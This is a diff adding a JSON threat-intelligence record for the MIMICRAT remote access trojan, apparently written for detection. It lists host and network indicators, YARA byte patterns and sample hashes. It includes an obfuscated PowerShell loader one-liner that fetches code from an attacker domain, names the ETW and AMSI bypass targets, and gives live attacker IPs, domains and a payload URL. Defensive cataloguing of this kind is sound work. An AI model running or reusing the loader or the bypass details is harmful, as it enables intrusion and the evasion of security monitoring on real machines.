@@ -1,0 +1,325 @@
+{
+  "malware_family": "MIMICRAT",
+  "threat_actor": "",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "MIMICRAT is a custom C++ RAT delivered via compromised websites using a multi-stage PowerShell and Lua loader chain. The malware features malleable C2 profiles mimicking legitimate web traffic, token impersonation, and SOCKS5 proxying. Its loader chain employs several defense evasion techniques, including ETW and AMSI bypasses, before executing the final implant entirely in memory.",
+  "mitre_techniques": [],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "powershell.exe -WInDo Min $RdLU='aZmEwGEtHPckKyBXPxMRi.neTwOrkicsGf';$OnRa=($RdLU.Substring(17,12));$jOFn=.($RdLU[(87)/(3)]+$RdLU[19]+$RdLU[2]) $OnRa;$TNNt=$jOFn; .($TNNt.Remove(0,3).Remove(3))($TNNt); # connects to xMRi.neTwOrk",
+      "context": "Stage 1 one-liner executed from clipboard via Run dialog.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "aZmEwGEtHPckKyBXPxMRi.neTwOrkicsGf",
+      "context": "Seed string in Stage 1 PowerShell for deobfuscation.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "System.Diagnostics.Eventing.EventProvider",
+      "context": "Target class for ETW bypass in Stage 2 PowerShell.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "m_enabled",
+      "context": "Field patched to 0 to disable ETW in Stage 2 PowerShell.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "System.Management.Automation.AmsiUtils",
+      "context": "Target class for AMSI bypass in Stage 2 PowerShell.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "amsiInitFailed",
+      "context": "Field patched to $true to disable AMSI in Stage 2 PowerShell.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "ScanContent",
+      "context": "Target method for AMSI memory patching.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%ProgramData%/knz_{random}",
+      "context": "Randomly named extraction directory for payload.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "zbuild.exe",
+      "context": "Lua loader executed from extracted ZIP archive.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "fxh::utility::lua_script_xor_decrypt",
+      "context": "Function name for Lua script decryption routine.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "@z1@@9&Yv6GR6vp#SyeG&ZkY0X74%JXLJEv2Ci8&J80AlVRJk&6Cl$Hb)%a8dgqthEa6!jbn70i27d4bLcE33acSoSaSsq6KpRaA7xDypo(5",
+      "context": "RC4 key for C2 hostname decryption.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "abcdefghijklmnop",
+      "context": "Hardcoded IV for AES C2 traffic encryption.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "AFUAK",
+      "context": "Cookie name in MIMICRAT GET profile.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "BLA",
+      "context": "Cookie name in MIMICRAT GET profile.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "ARCHUID",
+      "context": "Cookie name in MIMICRAT POST profile.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "hex_pattern",
+      "value": "{ 41 8B 56 18 49 8B 4E 10 41 89 46 08 }",
+      "context": "YARA rule signature for MIMICRAT.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "hex_pattern",
+      "value": "{ 41 FF C0 48 FF C1 48 83 C2 4C 49 3B CA }",
+      "context": "YARA rule signature for MIMICRAT.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "url",
+      "value": "https://www.investonline.in/js/jq.php",
+      "context": "Compromised site hosting ClickFix JavaScript payload.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "xMRi.neTwOrk",
+      "context": "Stage 1 C2 / payload delivery (deobfuscated).",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "WexMrI.CC",
+      "context": "Alternate Stage 1 C2 domain.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "d15mawx0xveem1.cloudfront.net",
+      "context": "MIMICRAT C2 relay hostname (RC4 encrypted).",
+      "specificity": "high",
+      "evidence": "encrypted_config",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/intake/organizations/events?channel=app",
+      "context": "URI path for MIMICRAT C2 GET check-in requests.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "user_agent",
+      "value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Cortana 1.14.9.19041; ...) Edge/18.19045",
+      "context": "User-Agent for MIMICRAT C2 GET requests.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "http_header",
+      "value": "Referer: https://www.google.com/?q=dj1",
+      "context": "Referer header for MIMICRAT C2 GET requests.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "http_header",
+      "value": "Accept-Language: zh-CN,zh;q=0.9",
+      "context": "Accept-Language header for MIMICRAT C2 GET requests.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/discover/pcversion/metrics?clientver=ds",
+      "context": "URI path for MIMICRAT C2 POST exfiltration requests.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "http_header",
+      "value": "Referer: https://gsov.google.com/",
+      "context": "Referer header for MIMICRAT C2 POST requests.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "45.13.212.250",
+      "context": "Payload delivery infrastructure.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "45.13.212.251",
+      "context": "Payload delivery infrastructure.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "23.227.202.114",
+      "context": "Post-exploitation C2.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "www.ndibstersoft.com",
+      "context": "Post-exploitation C2.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://backupdailyawss.s3.us-east-1.amazonaws.com/rgen.zip",
+      "context": "Payload delivery URL.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "bcc7a0e53ebc62c77b7b6e3585166bfd7164f65a8115e7c8bda568279ab4f6f1",
+      "description": "Stage 1 PowerShell payload"
+    },
+    {
+      "sha256": "5e0a30d8d91d5fd46da73f3e6555936233d870ac789ca7dd64c9d3cc74719f51",
+      "description": "Lua loader"
+    },
+    {
+      "sha256": "a508d0bb583dc6e5f97b6094f8f910b5b6f2b9d5528c04e4dee62c343fce6f4b",
+      "description": "MIMICRAT beacon"
+    },
+    {
+      "sha256": "055336daf2ac9d5bbc329fd52bb539085d00e2302fa75a0c7e9d52f540b28beb",
+      "description": "Related beacon sample"
+    }
+  ],
+  "file_types": [
+    "pe",
+    "script"
+  ]
+}
